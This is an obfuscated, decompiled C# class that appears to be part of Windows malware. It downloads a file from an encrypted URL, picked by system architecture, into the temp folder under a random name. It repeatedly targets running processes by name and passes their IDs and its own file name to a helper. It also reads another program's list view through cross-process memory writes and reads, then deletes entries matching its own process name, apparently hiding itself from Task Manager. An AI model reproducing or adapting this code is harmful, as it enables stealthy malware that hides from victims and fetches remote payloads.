using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace nZBhTHSmQawuU;

internal sealed class djdaSVrKaErYBLI
{
	private struct tKClSqsarBIX
	{
		public uint MqkgDyObZL;

		public IntPtr syUwpIUDWuscY;

		public IntPtr AjqVlGOnpk;

		public uint AkSIsDGBDKUpnCM;

		public uint fRxuythhVAJkjTf;

		public IntPtr PRdjZlxfSRsH;

		public uint KOcqciRABJGF;

		public int ZAPpDVDrIio;

		public IntPtr ZfNNmiurNzIN;
	}

	private static volatile bool IbiPVDEWSm;

	public static volatile bool rkBlyQbhYZoaL;

	[NonSerialized]
	internal static GetString getString_0;

	public static string MaMdUgblSntCxKhm()
	{
		if (IntPtr.Size == 8)
		{
			WzLdBSYJOokD.wgdHQULLuLT = GPqHKmLHKZCT(new Uri(WzLdBSYJOokD.FZgFrfaacxWpm(getString_0(107365398))));
		}
		else
		{
			WzLdBSYJOokD.wgdHQULLuLT = GPqHKmLHKZCT(new Uri(WzLdBSYJOokD.FZgFrfaacxWpm(getString_0(107364708))));
		}
		return WzLdBSYJOokD.wgdHQULLuLT;
	}

	public static string GPqHKmLHKZCT(Uri uri_0)
	{
		try
		{
			string path = Path.GetRandomFileName().Replace(getString_0(107367997), getString_0(107359012)).Remove(0, 3) + getString_0(107368024);
			WebClient webClient = new WebClient();
			webClient.DownloadFile(uri_0, Path.Combine(Path.GetTempPath(), path));
			return Path.Combine(Path.GetTempPath(), path);
		}
		catch
		{
		}
		return string.Empty;
	}

	public static Process nYUlyDfowm(string string_0)
	{
		Process[] processes = Process.GetProcesses();
		int num = 0;
		Process process;
		while (true)
		{
			if (num < processes.Length)
			{
				process = processes[num];
				if (process.ProcessName.Contains(string_0))
				{
					break;
				}
				num++;
				continue;
			}
			return null;
		}
		return process;
	}

	public static void dwhTsqfLtWUBR(string[] string_0)
	{
		string text = MaMdUgblSntCxKhm();
		if (string.IsNullOrEmpty(text))
		{
			return;
		}
		while (true)
		{
			foreach (string string_ in string_0)
			{
				Process process = nYUlyDfowm(string_);
				if (process != null)
				{
					string text2 = process.Id.ToString();
					WzLdBSYJOokD.cgSXEqOxPfYBfDJ(text, text2 + getString_0(107357432) + Path.GetFileName(Process.GetCurrentProcess().MainModule!.FileName));
					WzLdBSYJOokD.cgSXEqOxPfYBfDJ(text, text2 + getString_0(107357432) + Path.GetFileName(Process.GetCurrentProcess().MainModule!.FileName) + getString_0(107364594));
					WzLdBSYJOokD.cgSXEqOxPfYBfDJ(text, text2 + getString_0(107357432) + WzLdBSYJOokD.FZgFrfaacxWpm(getString_0(107364553)));
					WzLdBSYJOokD.cgSXEqOxPfYBfDJ(text, text2 + getString_0(107357432) + WzLdBSYJOokD.FZgFrfaacxWpm(getString_0(107356208)));
					WzLdBSYJOokD.cgSXEqOxPfYBfDJ(text, text2 + getString_0(107357432) + WzLdBSYJOokD.FZgFrfaacxWpm(getString_0(107364560)));
					WzLdBSYJOokD.cgSXEqOxPfYBfDJ(text, text2 + getString_0(107357432) + WzLdBSYJOokD.FZgFrfaacxWpm(getString_0(107365023)));
				}
			}
			Thread.Sleep(200);
		}
	}

	[DllImport("kernel32.dll")]
	private static extern IntPtr OpenProcess(int int_0, bool bool_0, uint uint_0);

	[DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
	private static extern IntPtr VirtualAllocEx(IntPtr intptr_0, IntPtr intptr_1, uint uint_0, int int_0, int int_1);

	[DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
	private static extern bool VirtualFreeEx(IntPtr intptr_0, IntPtr intptr_1, uint uint_0, int int_0);

	[DllImport("kernel32.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool CloseHandle(IntPtr novFnUwPFa);

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern bool WriteProcessMemory(IntPtr OJiZUVHnDCVbh, IntPtr gdoaCYJadcOj, byte[] DzKeCxQPQlh, uint SsZQcYsPQtERpO, out UIntPtr BXVlMijilGnR);

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern bool ReadProcessMemory(IntPtr vSueeQapWkfK, IntPtr PZelwctFwGYg, [Out] byte[] HGveQkYRGsyIK, int ruiwCXUZCov, out UIntPtr KepkhvHzzFTTc);

	[DllImport("user32.dll", SetLastError = true)]
	private static extern uint GetWindowThreadProcessId(IntPtr EGOEKXnwxuyuDt, out uint aqSBNkkYXNB);

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern IntPtr SendMessage(IntPtr intptr_0, uint uint_0, IntPtr intptr_1, IntPtr intptr_2);

	[DllImport("user32.dll", SetLastError = true)]
	private static extern IntPtr FindWindow(string string_0, string string_1);

	[DllImport("user32.dll", SetLastError = true)]
	private static extern IntPtr FindWindowEx(IntPtr intptr_0, IntPtr intptr_1, string string_0, string string_1);

	private static byte[] zlZoghffFgcd(object object_0)
	{
		int num = Marshal.SizeOf(object_0);
		byte[] array = new byte[num];
		IntPtr intPtr = Marshal.AllocHGlobal(num);
		Marshal.StructureToPtr(object_0, intPtr, fDeleteOld: true);
		Marshal.Copy(intPtr, array, 0, num);
		Marshal.FreeHGlobal(intPtr);
		return array;
	}

	private static IntPtr FxNscsDmEgX(uint uint_0)
	{
		return OpenProcess(56, bool_0: false, uint_0);
	}

	private static void ORbSLhVDkGVuQ(IntPtr intptr_0)
	{
		CloseHandle(intptr_0);
	}

	private static IntPtr fFrsxRMTkLwAW(uint uint_0, IntPtr intptr_0)
	{
		return VirtualAllocEx(intptr_0, IntPtr.Zero, uint_0, 12288, 4);
	}

	private static void mbfzXXKBCNZQU(IntPtr intptr_0, IntPtr intptr_1, uint uint_0)
	{
		VirtualFreeEx(intptr_0, intptr_1, uint_0, 32768);
	}

	private static IntPtr RrzABYryLK()
	{
		IntPtr intPtr = FindWindow(getString_0(107365038), getString_0(107365013));
		if (intPtr == IntPtr.Zero)
		{
			intPtr = FindWindow(getString_0(107364980), getString_0(107364939));
			intPtr = FindWindowEx(intPtr, IntPtr.Zero, getString_0(107364980), null);
			return FindWindowEx(intPtr, IntPtr.Zero, getString_0(107364954), getString_0(107364901));
		}
		intPtr = FindWindowEx(intPtr, IntPtr.Zero, getString_0(107364980), null);
		return FindWindowEx(intPtr, IntPtr.Zero, getString_0(107364954), getString_0(107364920));
	}

	private static IntPtr ODaVgKFeOzvNF(IntPtr intptr_0)
	{
		return SendMessage(intptr_0, 4100u, IntPtr.Zero, IntPtr.Zero);
	}

	private static void pbtXkvBOfWhZT(IntPtr intptr_0, IntPtr intptr_1)
	{
		SendMessage(intptr_0, 4104u, intptr_1, IntPtr.Zero);
	}

	private static void isOmtxSRhQCL(IntPtr intptr_0)
	{
		SendMessage(intptr_0, 4124u, IntPtr.Zero, IntPtr.Zero);
	}

	private static string iyPnYlBJmqcOsf(IntPtr intptr_0, IntPtr intptr_1)
	{
		byte[] array = new byte[50];
		tKClSqsarBIX tKClSqsarBIX = default(tKClSqsarBIX);
		GetWindowThreadProcessId(intptr_0, out var aqSBNkkYXNB);
		IntPtr intPtr = FxNscsDmEgX(aqSBNkkYXNB);
		IntPtr intPtr2 = fFrsxRMTkLwAW((uint)Marshal.SizeOf(tKClSqsarBIX), intPtr);
		IntPtr intPtr3 = fFrsxRMTkLwAW(50u, intPtr);
		tKClSqsarBIX.syUwpIUDWuscY = intptr_1;
		tKClSqsarBIX.AjqVlGOnpk = (IntPtr)0;
		tKClSqsarBIX.KOcqciRABJGF = 50u;
		tKClSqsarBIX.PRdjZlxfSRsH = intPtr3;
		WriteProcessMemory(intPtr, intPtr2, zlZoghffFgcd(tKClSqsarBIX), (uint)Marshal.SizeOf(tKClSqsarBIX), out var BXVlMijilGnR);
		SendMessage(intptr_0, 4141u, intptr_1, intPtr2);
		ReadProcessMemory(intPtr, intPtr3, array, 50, out BXVlMijilGnR);
		mbfzXXKBCNZQU(intPtr, intPtr2, (uint)Marshal.SizeOf(tKClSqsarBIX));
		mbfzXXKBCNZQU(intPtr, intPtr3, 50u);
		ORbSLhVDkGVuQ(intPtr);
		return Encoding.ASCII.GetString(array);
	}

	private static void DgrjfZzlrIpbU(string string_0)
	{
		IntPtr intPtr = RrzABYryLK();
		if (!(intPtr != IntPtr.Zero))
		{
			return;
		}
		int num = (int)ODaVgKFeOzvNF(intPtr);
		for (int i = 0; i < num; i++)
		{
			string text = iyPnYlBJmqcOsf(intPtr, (IntPtr)i);
			if (text.Contains(string_0))
			{
				pbtXkvBOfWhZT(intPtr, (IntPtr)i);
			}
		}
	}

	private static void YjOubJnMGRn()
	{
		IntPtr intPtr = RrzABYryLK();
		if (intPtr != IntPtr.Zero)
		{
			isOmtxSRhQCL(intPtr);
			isOmtxSRhQCL(intPtr);
			isOmtxSRhQCL(intPtr);
			isOmtxSRhQCL(intPtr);
			isOmtxSRhQCL(intPtr);
		}
	}

	public static void SkYkfoEjlrQgW()
	{
		Thread thread = new Thread(cHDFpQIFiKp);
		thread.Start();
	}

	private static void cHDFpQIFiKp()
	{
		while (!IbiPVDEWSm)
		{
			if (rkBlyQbhYZoaL)
			{
				DgrjfZzlrIpbU(Process.GetCurrentProcess().ProcessName + getString_0(107368024));
				Thread.Sleep(525);
			}
			else
			{
				YjOubJnMGRn();
				Thread.Sleep(1000);
			}
		}
		IbiPVDEWSm = false;
	}

	static djdaSVrKaErYBLI()
	{
		Strings.CreateGetStringDelegate(typeof(djdaSVrKaErYBLI));
		IbiPVDEWSm = false;
		rkBlyQbhYZoaL = true;
	}
}
